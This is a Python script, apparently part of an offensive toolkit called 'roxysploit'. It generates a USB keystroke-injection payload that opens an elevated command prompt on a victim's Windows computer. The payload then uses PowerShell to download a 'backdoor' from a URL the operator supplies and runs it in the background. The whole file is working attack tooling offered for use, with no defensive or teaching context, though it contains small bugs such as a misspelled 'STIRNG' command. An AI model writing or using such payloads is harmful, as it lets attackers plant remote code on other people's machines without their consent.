#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys

def doit(anchor,savename):
    try:
        payloadfile = open("Storage/payload.txt","w")
        toedit= """
    ATTACKMODE HID
    LED B 200
    Q GUI r
    Q DELAY 500
    Q STRING cmd
    Q DELAY 500
    Q CTRL-SHIFT ENTER
    Q DELAY 2000
    Q STRING "powershell(new-object net.webclient).DownloadFile('%s','%s') ;"
    Q ENTER
    Q STRING "start /B %s ;"
    Q ENTER
    Q DELAY 100
    Q STIRNG "%s"
    Q ENTER
    LED CLEANUP
    Q STRING "exit"
    Q ENTER
    LED FINISH
    """ % (anchor,savename,savename,savename)
        payloadfile.write(toedit)
        payloadfile.close()
        print("\033[1;92m[!] File writen to Storage/payload.txt\033[0m")
        os.system("cat Storage/payload.txt")
        sys.exit()
    except Exception as e:
        print("\033[91m[!] Something went wrong :( \n Please update roxysploit!\033[0m")
        print ("\033[91m"+e+"\033[0m")
        sys.exit()

def main():
    print("\033[1;94m[?]\033[1;m URL :: Give a url of the backdoor you want to execute on the victims Windows 7 or 10 computer")
    url = str(input("\033[1;92m[+]\033[1;m url: [https://google.com/yeehaw.bat]: "))
    print("\033[1;94m[?]\033[1;m URL :: What do you want the filename to be saved as on the victim's computer")
    fielname = str(input("\033[1;92m[+]\033[1;m name: [kappa.bat]: "))
    if not url:
        url = "https://google.com/yehaw.bat"
    if not fielname:
        fielname="kappa.bat"
    doit(url,fielname)
main()
